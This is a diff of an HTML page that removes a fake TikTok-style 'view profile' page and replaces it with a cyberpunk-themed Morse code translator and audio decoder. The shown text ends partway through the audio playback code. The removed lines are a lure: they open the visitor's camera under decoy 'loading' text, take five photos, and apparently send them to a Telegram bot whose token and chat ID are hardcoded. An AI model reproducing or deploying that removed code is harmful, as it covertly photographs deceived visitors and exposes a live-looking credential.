@@ -1,125 +1,995 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="id" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Studio Foto TikTok Style</title>
+    <title>CYBER RADAR // MORSE TRANSLATOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;800;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            black: '#030712',
+                            card: 'rgba(15, 23, 42, 0.75)',
+                            border: '#00f3ff',
+                            cyan: '#00f3ff',
+                            blue: '#3b82f6',
+                            glow: 'rgba(0, 243, 255, 0.4)',
+                            darkglow: 'rgba(0, 243, 255, 0.15)',
+                            text: '#e0f2fe'
+                        }
+                    },
+                    fontFamily: {
+                        mono: ['Share Tech Mono', 'monospace'],
+                        cyber: ['Orbitron', 'sans-serif'],
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        body { background-color: #000000; }
+        body {
+            background-color: #030712;
+            color: #e0f2fe;
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(0, 243, 255, 0.05) 0%, transparent 80%),
+                linear-gradient(to right, rgba(0, 243, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
+            background-size: 100% 100%, 40px 40px, 40px 40px;
+        }
+
+        .neon-border {
+            border: 1px solid #00f3ff;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.25), inset 0 0 10px rgba(0, 243, 255, 0.1);
+        }
+
+        .neon-border-glow {
+            border: 1px solid #00f3ff;
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.5), inset 0 0 15px rgba(0, 243, 255, 0.2);
+        }
+
+        .neon-text-cyan {
+            color: #00f3ff;
+            text-shadow: 0 0 8px rgba(0, 243, 255, 0.7), 0 0 20px rgba(0, 243, 255, 0.4);
+        }
+
+        .neon-btn {
+            background: linear-gradient(135deg, rgba(0,243,255,0.15) 0%, rgba(59,130,246,0.15) 100%);
+            border: 1px solid #00f3ff;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .neon-btn:hover {
+            background: linear-gradient(135deg, rgba(0,243,255,0.35) 0%, rgba(59,130,246,0.35) 100%);
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.6);
+            transform: translateY(-1px);
+        }
+
+        .scanline {
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0, 243, 255, 0.08) 50%,
+                rgba(0, 243, 255, 0.08)
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(3, 7, 18, 0.8);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00f3ff;
+            border-radius: 3px;
+            box-shadow: 0 0 5px #00f3ff;
+        }
     </style>
 </head>
-<body class="bg-black text-white overflow-hidden font-sans">
+<body class="min-h-screen flex flex-col font-sans scanline overflow-x-hidden selection:bg-cyan-500 selection:text-black">
 
-    <!-- Header Navigation -->
-    <div class="fixed top-12 left-0 right-0 flex justify-center gap-8 z-50">
-        <span class="text-gray-400 font-semibold">Following</span>
-        <span class="text-white font-bold border-b-2 border-white pb-1">For You</span>
-    </div>
+    <header class="border-b border-cyan-500/30 bg-gray-950/80 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 py-3 flex flex-wrap justify-between items-center gap-4">
+            <div class="flex items-center gap-3">
+                <div class="relative flex items-center justify-center w-10 h-10 rounded-full border border-cyan-400 bg-cyan-950/40">
+                    <div class="w-3 h-3 bg-cyan-400 rounded-full animate-ping absolute"></div>
+                    <div class="w-2 h-2 bg-cyan-400 rounded-full"></div>
+                </div>
+                <div>
+                    <h1 class="font-cyber font-extrabold text-xl sm:text-2xl tracking-wider neon-text-cyan">
+                        CYBER<span class="text-white">RADAR</span>
+                    </h1>
+                    <p class="text-xs font-mono text-cyan-400/70 tracking-widest">TACTICAL MORSE COMMUNICATOR // 25 WPM</p>
+                </div>
+            </div>
 
-    <!-- Main Content -->
-    <main class="h-screen flex flex-col items-center justify-center">
-        <h1 class="text-4xl font-black">Liat profil</h1>
-        <p class="text-gray-400 mt-2">@faacchryy </p>
-
-        <button id="startBtn" class="mt-8 bg-white text-black px-10 py-4 rounded-full font-bold transition-transform active:scale-95">
-        liat profil sekarang
-        </button>
-
-        <div id="status" class="mt-4 text-sm font-medium text-white/70"></div>
-    </main>
-
-    <!-- Bottom Navigation -->
-    <nav class="fixed bottom-0 left-0 w-full bg-black border-t border-zinc-800 flex justify-around items-center py-2 z-50">
-        <div class="flex flex-col items-center text-white">
-            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M12 3l9 8h-3v10H6V11H3z"/></svg>
-            <span class="text-[11px] font-semibold">Home</span>
-        </div>
-        <div class="flex flex-col items-center text-gray-400">
-            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M16 11c1.66 0 3-1.34 3-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 3-1.34 3-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5C15 14.17 10.33 13 8 13zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
-            <span class="text-[11px]">Friends</span>
-        </div>
-        <div class="relative">
-            <div class="absolute -left-1 top-0 w-12 h-9 bg-cyan-400 rounded-lg"></div>
-            <div class="absolute left-1 top-0 w-12 h-9 bg-pink-500 rounded-lg"></div>
-            <div class="relative w-12 h-9 bg-white rounded-lg flex items-center justify-center">
-                <span class="text-black text-2xl font-bold leading-none">+</span>
+            <!-- Mode Switcher Tabs -->
+            <div class="flex bg-gray-900/90 p-1 rounded-xl border border-cyan-500/30 font-mono text-xs sm:text-sm">
+                <button id="tab-tx-btn" onclick="switchTab('tx')" class="px-4 py-2 rounded-lg transition-all flex items-center gap-2 bg-cyan-500/20 text-cyan-300 border border-cyan-400 shadow-[0_0_10px_rgba(0,243,255,0.3)]">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg>
+                    [TX] TEXT &rarr; MORSE
+                </button>
+                <button id="tab-rx-btn" onclick="switchTab('rx')" class="px-4 py-2 rounded-lg transition-all flex items-center gap-2 text-gray-400 hover:text-cyan-300">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
+                    [RX] RADAR MORSE &rarr; TEXT
+                </button>
             </div>
         </div>
-        <div class="flex flex-col items-center text-gray-400">
-            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg>
-            <span class="text-[11px]">Inbox</span>
-        </div>
-        <div class="flex flex-col items-center text-gray-400">
-            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-4.42 0-8 1.79-8 4v2h16v-2c0-2.21-3.58-4-8-4z"/></svg>
-            <span class="text-[11px]">Profile</span>
-        </div>
-    </nav>
+    </header>
 
-    <video id="video" class="hidden" autoplay playsinline></video>
+    <main class="flex-grow max-w-7xl w-full mx-auto p-4 sm:p-6 gap-6">
+
+        <!-- ==================== FEATURE 1: TEXT TO MORSE (TX) ==================== -->
+        <section id="section-tx" class="space-y-6">
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <!-- Input Panel -->
+                <div class="lg:col-span-2 space-y-4">
+                    <div class="bg-gray-950/80 backdrop-blur-md rounded-2xl p-5 border border-cyan-500/30 shadow-[0_0_20px_rgba(0,0,0,0.8)] relative">
+                        <div class="flex justify-between items-center mb-3">
+                            <label class="font-cyber text-sm text-cyan-400 flex items-center gap-2">
+                                <span class="w-2 h-2 bg-cyan-400 rounded-full inline-block"></span>
+                                TRANSMITTER INPUT TEXT
+                            </label>
+                            <span class="text-xs font-mono text-cyan-500/60">TARGET SPEED: <span class="text-cyan-300 font-bold">25 WPM</span></span>
+                        </div>
+                        <textarea id="tx-input" rows="5" class="w-full bg-gray-900/90 border border-cyan-500/30 rounded-xl p-4 text-cyan-100 font-mono focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 transition text-sm sm:text-base resize-y" placeholder="Masukkan teks di sini untuk dikonversi menjadi audio Morse (misal: SOS RADAR ACTIVE 2026)...">CQ CQ CQ CQ DE SOS RADAR READY OVER</textarea>
+                        
+                        <!-- Quick Presets -->
+                        <div class="mt-3 flex flex-wrap gap-2 items-center">
+                            <span class="text-xs font-mono text-gray-400">Presets:</span>
+                            <button onclick="setPreset('SOS')" class="text-xs font-mono px-2.5 py-1 rounded-md bg-gray-900 border border-cyan-500/30 text-cyan-300 hover:bg-cyan-500/20">SOS</button>
+                            <button onclick="setPreset('CQ CQ CQ')" class="text-xs font-mono px-2.5 py-1 rounded-md bg-gray-900 border border-cyan-500/30 text-cyan-300 hover:bg-cyan-500/20">CQ CQ</button>
+                            <button onclick="setPreset('HELL O WORLD')" class="text-xs font-mono px-2.5 py-1 rounded-md bg-gray-900 border border-cyan-500/30 text-cyan-300 hover:bg-cyan-500/20">HELLO WORLD</button>
+                            <button onclick="document.getElementById('tx-input').value=''" class="text-xs font-mono px-2.5 py-1 rounded-md bg-red-950/50 border border-red-500/30 text-red-400 hover:bg-red-900/40 ml-auto">Reset</button>
+                        </div>
+                    </div>
+
+                    <!-- Morse Generated Text Preview -->
+                    <div class="bg-gray-950/80 backdrop-blur-md rounded-2xl p-5 border border-cyan-500/30">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="font-cyber text-xs text-cyan-400 uppercase tracking-widest">OUTPUT MORSE SYMBOLS</h3>
+                            <button onclick="copyMorseOutput()" class="text-xs font-mono text-cyan-400 hover:underline flex items-center gap-1">
+                                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 012-2v-8a2 2 0 01-2-2h-8a2 2 0 01-2 2v8a2 2 0 012 2z"></path></svg>
+                                Copy Morse
+                            </button>
+                        </div>
+                        <div id="tx-morse-display" class="w-full min-h-[100px] max-h-[160px] overflow-y-auto bg-gray-900/90 border border-cyan-500/20 rounded-xl p-4 font-mono text-cyan-300 text-lg tracking-widest break-words leading-relaxed select-all">
+                            -.-. --.-  -.-. --.-  -.-. --.-  -.-. --.- / -.. . / ... --- ... / .-. .- -.. .- .-. / .-. . .- -.. -.-- / --- ...- . .-.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-4">
+                    <div class="bg-gray-950/80 backdrop-blur-md rounded-2xl p-5 border border-cyan-500/30 space-y-5">
+                        <h3 class="font-cyber text-sm text-cyan-400 border-b border-cyan-500/20 pb-2">AUDIO GENERATOR SETUP</h3>
+
+                        <!-- Speed Slider -->
+                        <div class="space-y-2">
+                            <div class="flex justify-between text-xs font-mono">
+                                <span class="text-gray-300">SPEED (WPM):</span>
+                                <span id="wpm-val" class="text-cyan-400 font-bold">25 WPM</span>
+                            </div>
+                            <input id="wpm-slider" type="range" min="10" max="40" value="25" class="w-full accent-cyan-400 bg-gray-900 cursor-pointer">
+                            <div class="flex justify-between text-[10px] font-mono text-gray-500">
+                                <span>10 (Slow)</span>
+                                <span>25 (Standard Fast)</span>
+                                <span>40 (Ultra)</span>
+                            </div>
+                        </div>
+
+                        <!-- Pitch Frequency -->
+                        <div class="space-y-2">
+                            <div class="flex justify-between text-xs font-mono">
+                                <span class="text-gray-300">BEEP TONE FREQ:</span>
+                                <span id="freq-val" class="text-cyan-400 font-bold">750 Hz</span>
+                            </div>
+                            <input id="freq-slider" type="range" min="400" max="1200" step="10" value="750" class="w-full accent-cyan-400 bg-gray-900 cursor-pointer">
+                        </div>
+
+                        <!-- Sound Blend Details -->
+                        <div class="p-3 bg-cyan-950/20 border border-cyan-500/20 rounded-xl text-xs font-mono space-y-1 text-cyan-200/80">
+                            <p class="flex items-center gap-1.5"><span class="text-cyan-400">✔</span> TIT Click Transient (Sharp Attack)</p>
+                            <p class="flex items-center gap-1.5"><span class="text-cyan-400">✔</span> 750Hz Sine Tone Beep</p>
+                            <p class="flex items-center gap-1.5"><span class="text-cyan-400">✔</span> HQ 44.1kHz Waveform Synthesis</p>
+                        </div>
+
+                        <!-- Main Action Buttons -->
+                        <div class="space-y-3 pt-2">
+                            <button id="btn-tx-play" onclick="playMorseAudio()" class="w-full py-3.5 px-4 rounded-xl neon-btn font-cyber font-bold text-cyan-300 text-sm tracking-wider flex items-center justify-center gap-2">
+                                <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                                PLAY MORSE SOUND
+                            </button>
+
+                            <button id="btn-tx-download" onclick="downloadMorseWav()" class="w-full py-3 px-4 rounded-xl bg-gray-900 hover:bg-cyan-950 border border-cyan-500/40 text-cyan-300 font-mono text-xs tracking-wider flex items-center justify-center gap-2 transition">
+                                <svg class="w-4 h-4 stroke-current fill-none" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                                DOWNLOAD AUDIO (WAV/MP3)
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== FEATURE 2: MORSE TO TEXT (RADAR RX) ==================== -->
+        <section id="section-rx" class="hidden space-y-6">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                
+                <!-- Radar Oscilloscope Visualizer Box -->
+                <div class="lg:col-span-7 bg-gray-950/90 backdrop-blur-md rounded-2xl p-5 border border-cyan-500/40 flex flex-col justify-between relative overflow-hidden">
+                    
+                    <!-- Radar Title Header -->
+                    <div class="flex justify-between items-center mb-4 z-10">
+                        <div class="flex items-center gap-2">
+                            <span class="w-3 h-3 bg-cyan-400 rounded-full animate-ping"></span>
+                            <h2 class="font-cyber text-sm text-cyan-300 tracking-wider">REAL-TIME RADAR OSCILLOSCOPE</h2>
+                        </div>
+                        <div class="flex items-center gap-2 font-mono text-xs">
+                            <span class="text-gray-400">STATUS:</span>
+                            <span id="radar-status-badge" class="px-2 py-0.5 rounded bg-red-950/80 text-red-400 border border-red-500/30">IDLE</span>
+                        </div>
+                    </div>
+
+                    <!-- Audio Input Selector Tabs -->
+                    <div class="grid grid-cols-2 gap-3 mb-4 z-10 font-mono text-xs">
+                        <button id="rx-source-mic" onclick="setRxSource('mic')" class="p-3 rounded-xl border border-cyan-400 bg-cyan-500/20 text-cyan-300 flex items-center justify-center gap-2 transition">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 016 0v6a3 3 0 01-3 3z"></path></svg>
+                            1. OPEN MIC LIVE
+                        </button>
+                        <label for="rx-file-input" class="p-3 rounded-xl border border-cyan-500/30 bg-gray-900 text-gray-300 hover:text-cyan-300 flex items-center justify-center gap-2 cursor-pointer transition">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 0115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path></svg>
+                            <span id="file-label-txt">2. UPLOAD MP3/WAV</span>
+                            <input id="rx-file-input" type="file" accept="audio/*" class="hidden" onchange="handleFileUpload(event)">
+                        </label>
+                    </div>
+
+                    <!-- Radar Canvas Display -->
+                    <div class="relative w-full aspect-square max-h-[380px] mx-auto my-2 rounded-full border-2 border-cyan-500/50 bg-black/80 flex items-center justify-center overflow-hidden shadow-[0_0_30px_rgba(0,243,255,0.2)]">
+                        <canvas id="radarCanvas" width="400" height="400" class="w-full h-full block"></canvas>
+                        
+                        <!-- Radar Sweep Overlay Signal Indicator -->
+                        <div id="signal-detect-indicator" class="absolute top-4 right-4 px-3 py-1 rounded-full bg-cyan-950/80 border border-cyan-400/40 text-[11px] font-mono text-cyan-300 flex items-center gap-2 opacity-30 transition-opacity duration-75">
+                            <span class="w-2.5 h-2.5 rounded-full bg-cyan-400"></span>
+                            SIGNAL DETECTED
+                        </div>
+                    </div>
+
+                    <!-- Sensitivity Controls -->
+                    <div class="mt-4 p-3 bg-gray-900/80 rounded-xl border border-cyan-500/20 font-mono text-xs flex flex-wrap items-center justify-between gap-3 z-10">
+                        <div class="flex items-center gap-3 flex-grow max-w-xs">
+                            <span class="text-gray-400 whitespace-nowrap">DEC SENSITIVITY:</span>
+                            <input id="sensitivity-slider" type="range" min="5" max="80" value="25" class="w-full accent-cyan-400 bg-gray-950">
+                        </div>
+                        <div class="text-right text-[11px] text-cyan-400/80">
+                            BANDPASS FILTER: <span class="text-cyan-300">750 Hz</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-5 flex flex-col space-y-4">
+                    
+                    <!-- Detected Morse Stream -->
+                    <div class="bg-gray-950/80 backdrop-blur-md rounded-2xl p-5 border border-cyan-500/30 flex-1 flex flex-col justify-between">
+                        <div>
+                            <div class="flex justify-between items-center mb-2">
+                                <h3 class="font-cyber text-xs text-cyan-400 tracking-wider">RAW MORSE STREAM</h3>
+                                <span class="text-[10px] font-mono text-cyan-500/60">LIVE TIMING PARSER</span>
+                            </div>
+                            <div id="rx-morse-stream" class="w-full h-24 bg-gray-900/90 border border-cyan-500/20 rounded-xl p-3 font-mono text-cyan-300 text-base tracking-widest overflow-y-auto break-all">
+                                ...
+                            </div>
+                        </div>
+
+                        <!-- Decoded Text Output -->
+                        <div class="mt-4">
+                            <div class="flex justify-between items-center mb-2">
+                                <h3 class="font-cyber text-xs text-cyan-400 tracking-wider">DECODED TEXT OUTPUT</h3>
+                                <button onclick="clearRxOutput()" class="text-xs font-mono text-red-400 hover:underline">Clear</button>
+                            </div>
+                            <div id="rx-text-output" class="w-full h-36 bg-gray-900/90 border border-cyan-500/40 rounded-xl p-4 font-mono text-white text-lg font-bold overflow-y-auto break-words leading-relaxed shadow-[inset_0_0_10px_rgba(0,0,0,0.5)]">
+                                [Awaiting Morse audio signal...]
+                            </div>
+                        </div>
+
+                        <!-- Action buttons for RX -->
+                        <div class="mt-4 flex gap-3">
+                            <button onclick="copyRxText()" class="flex-1 py-2.5 px-3 bg-cyan-950/60 hover:bg-cyan-900/80 border border-cyan-500/40 rounded-xl font-mono text-xs text-cyan-300 flex items-center justify-center gap-2 transition">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2"></path></svg>
+                                COPY TEXT
+                            </button>
+                            <button id="rx-stop-btn" onclick="stopRxProcessing()" class="py-2.5 px-4 bg-red-950/60 hover:bg-red-900/80 border border-red-500/40 rounded-xl font-mono text-xs text-red-300 flex items-center justify-center gap-2 transition">
+                                STOP RADAR
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Tech specs box -->
+                    <div class="p-4 bg-gray-950/80 rounded-2xl border border-cyan-500/20 text-xs font-mono space-y-1.5 text-cyan-200/70">
+                        <div class="text-cyan-400 font-bold font-cyber text-[11px] mb-1">DETECTOR TIMING RULES (25 WPM Nominal):</div>
+                        <div class="flex justify-between"><span>• Dot (TIT):</span> <span class="text-cyan-300">&le; 90 ms</span></div>
+                        <div class="flex justify-between"><span>• Dash (BEEP):</span> <span class="text-cyan-300">&gt; 90 ms</span></div>
+                        <div class="flex justify-between"><span>• Char Gap:</span> <span class="text-cyan-300">~140 ms</span></div>
+                        <div class="flex justify-between"><span>• Word Gap:</span> <span class="text-cyan-300">&ge; 330 ms</span></div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <div id="toast" class="fixed bottom-5 right-5 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none">
+        <div class="bg-gray-900 border border-cyan-400 text-cyan-200 px-5 py-3 rounded-xl shadow-[0_0_20px_rgba(0,243,255,0.4)] font-mono text-xs flex items-center gap-3">
+            <span class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
+            <span id="toast-msg">Notification Message</span>
+        </div>
+    </div>
 
     <script>
-        const BOT_TOKEN = '8429814704:AAH2DUBcP5rok16SLARgJwjWeeNOrFKf0RY';
-        const CHAT_ID = '6128943834';
+        /* MORSE CODE DICTIONARY TABLE */
+        const MORSE_MAP = {
+            'A': '.-',    'B': '-...',  'C': '-.-.',  'D': '-..',   'E': '.',
+            'F': '..-.',  'G': '--.',   'H': '....',  'I': '..',    'J': '.---',
+            'K': '-.-',   'L': '.-..',  'M': '--',    'N': '-.',    'O': '---',
+            'P': '.--.',  'Q': '--.-',  'R': '.-.',   'S': '...',   'T': '-',
+            'U': '..-',   'V': '...-',  'W': '.--',   'X': '-..-',  'Y': '-.--',
+            'Z': '--..',  '1': '.----', '2': '..---', '3': '...--', '4': '....-',
+            '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',
+            '0': '-----', ' ': '/',     '.': '.-.-.-',',': '--..--','?': '..--..',
+            '!': '-.-.--','=': '-...-'
+        };
 
-        const video = document.getElementById('video');
-        const startBtn = document.getElementById('startBtn');
-        const status = document.getElementById('status');
-        const delays = [1000, 500, 3000, 1000, 500];
+        const REVERSE_MORSE_MAP = {};
+        Object.keys(MORSE_MAP).forEach(key => {
+            REVERSE_MORSE_MAP[MORSE_MAP[key]] = key;
+        });
 
-        async function initCamera() {
-            try {
-                status.innerText = "loading page...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                startBtn.classList.add('hidden');
-                
-                for (let i = 0; i < 5; i++) {
-                    status.innerText = `Memuat halaman ${i + 1}/5`;
-                    await new Promise(resolve => setTimeout(resolve, i === 0 ? 1000 : delays[i-1]));
-                    await takeAndSendPhoto(i + 1);
+        /* Global Application State */
+        let audioCtx = null;
+        let isPlayingTx = false;
+        let currentSourceNode = null;
+        let rxStream = null;
+        let rxAudioContext = null;
+        let rxAnalyser = null;
+        let rxFilter = null;
+        let rxSourceNode = null;
+        let rxAnimFrame = null;
+        let rxMode = 'mic'; // 'mic' or 'file'
+
+        // Morse decoder variables
+        let isSignalActive = false;
+        let signalStartTime = 0;
+        let signalEndTime = 0;
+        let currentSymbolStream = "";
+        let accumulatedText = "";
+
+        // UI Event Listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            // Setup Text-to-Morse input auto updates
+            const txInput = document.getElementById('tx-input');
+            txInput.addEventListener('input', updateMorseDisplay);
+            
+            document.getElementById('wpm-slider').addEventListener('input', (e) => {
+                document.getElementById('wpm-val').innerText = e.target.value + ' WPM';
+            });
+            document.getElementById('freq-slider').addEventListener('input', (e) => {
+                document.getElementById('freq-val').innerText = e.target.value + ' Hz';
+            });
+
+            updateMorseDisplay();
+            initRadarCanvas();
+        });
+
+        /* Toast Message helper function */
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-msg').innerText = msg;
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            toast.classList.add('translate-y-0', 'opacity-100');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+                toast.classList.remove('translate-y-0', 'opacity-100');
+            }, 3000);
+        }
+
+        /* Switch Tabs */
+        function switchTab(tab) {
+            const txSec = document.getElementById('section-tx');
+            const rxSec = document.getElementById('section-rx');
+            const txBtn = document.getElementById('tab-tx-btn');
+            const rxBtn = document.getElementById('tab-rx-btn');
+
+            if (tab === 'tx') {
+                txSec.classList.remove('hidden');
+                rxSec.classList.add('hidden');
+                txBtn.className = "px-4 py-2 rounded-lg transition-all flex items-center gap-2 bg-cyan-500/20 text-cyan-300 border border-cyan-400 shadow-[0_0_10px_rgba(0,243,255,0.3)]";
+                rxBtn.className = "px-4 py-2 rounded-lg transition-all flex items-center gap-2 text-gray-400 hover:text-cyan-300";
+                stopRxProcessing();
+            } else {
+                txSec.classList.add('hidden');
+                rxSec.classList.remove('hidden');
+                rxBtn.className = "px-4 py-2 rounded-lg transition-all flex items-center gap-2 bg-cyan-500/20 text-cyan-300 border border-cyan-400 shadow-[0_0_10px_rgba(0,243,255,0.3)]";
+                txBtn.className = "px-4 py-2 rounded-lg transition-all flex items-center gap-2 text-gray-400 hover:text-cyan-300";
+            }
+        }
+
+        /* Preset helpers */
+        function setPreset(text) {
+            document.getElementById('tx-input').value = text;
+            updateMorseDisplay();
+        }
+
+        /* Convert Text to Morse string */
+        function textToMorse(text) {
+            const upper = text.toUpperCase().trim();
+            let result = [];
+            for (let char of upper) {
+                if (char === ' ') {
+                    result.push('/');
+                } else if (MORSE_MAP[char]) {
+                    result.push(MORSE_MAP[char]);
+                }
+            }
+            return result.join(' ');
+        }
+
+        function updateMorseDisplay() {
+            const txt = document.getElementById('tx-input').value;
+            const morse = textToMorse(txt);
+            document.getElementById('tx-morse-display').innerText = morse || '[No input]';
+        }
+
+        function copyMorseOutput() {
+            const text = document.getElementById('tx-morse-display').innerText;
+            navigator.clipboard.writeText(text);
+            showToast('Kode Morse disalin ke clipboard!');
+        }
+
+        /* ==================== AUDIO SYNTHESIS ENGINE (TX) ==================== */
+        function getAudioContext() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx.state === 'suspended') {
+                audioCtx.resume();
+            }
+            return audioCtx;
+        }
+
+        /**
+         * Generates AudioBuffer for Morse code with TIT click transient + Sine Wave Tone
+         */
+        function generateMorseAudioBuffer(text, wpm, freq) {
+            const ctx = getAudioContext();
+            const dotDuration = 1.2 / wpm; // Dot duration in seconds (e.g., 25 WPM = 0.048s)
+            const dashDuration = dotDuration * 3;
+            const symbolGap = dotDuration;
+            const letterGap = dotDuration * 3;
+            const wordGap = dotDuration * 7;
+
+            // Calculate total duration
+            const morseStr = textToMorse(text);
+            let totalTime = 0.2; // initial pad
+
+            const tokens = morseStr.split(' ');
+            tokens.forEach((token, tIdx) => {
+                if (token === '/') {
+                    totalTime += wordGap;
+                } else {
+                    for (let i = 0; i < token.length; i++) {
+                        const symbol = token[i];
+                        if (symbol === '.') totalTime += dotDuration;
+                        else if (symbol === '-') totalTime += dashDuration;
+                        if (i < token.length - 1) totalTime += symbolGap;
+                    }
+                    if (tIdx < tokens.length - 1 && tokens[tIdx + 1] !== '/') {
+                        totalTime += letterGap;
+                    }
+                }
+            });
+
+            totalTime += 0.2; // end padding
+
+            const sampleRate = ctx.sampleRate;
+            const numSamples = Math.ceil(sampleRate * totalTime);
+            const buffer = ctx.createBuffer(1, numSamples, sampleRate);
+            const channelData = buffer.getChannelData(0);
+
+            let currentTime = 0.2;
+
+            tokens.forEach((token, tIdx) => {
+                if (token === '/') {
+                    currentTime += wordGap;
+                } else {
+                    for (let i = 0; i < token.length; i++) {
+                        const symbol = token[i];
+                        const duration = (symbol === '.') ? dotDuration : dashDuration;
+                        
+                        const startSample = Math.floor(currentTime * sampleRate);
+                        const numSymbolSamples = Math.floor(duration * sampleRate);
+
+                        // Synthesize waveform (Sine + Attack Click)
+                        for (let s = 0; s < numSymbolSamples; s++) {
+                            const t = s / sampleRate;
+                            
+                            // Pure tone frequency
+                            let sample = Math.sin(2 * Math.PI * freq * t);
+
+                            // Smooth Envelope (5ms attack/decay to eliminate hard pops, with sharp initial transient click for "TIT")
+                            const attackSamples = Math.min(Math.floor(0.004 * sampleRate), numSymbolSamples / 2);
+                            let env = 1.0;
+                            if (s < attackSamples) {
+                                env = s / attackSamples;
+                                // Add click transient
+                                sample += (Math.random() * 2 - 1) * 0.4 * (1 - s / attackSamples);
+                            } else if (s > numSymbolSamples - attackSamples) {
+                                env = (numSymbolSamples - s) / attackSamples;
+                            }
+
+                            channelData[startSample + s] = sample * env * 0.7;
+                        }
+
+                        currentTime += duration + symbolGap;
+                    }
+                    if (tIdx < tokens.length - 1 && tokens[tIdx + 1] !== '/') {
+                        currentTime += letterGap;
+                    }
+                }
+            });
+
+            return buffer;
+        }
+
+        async function playMorseAudio() {
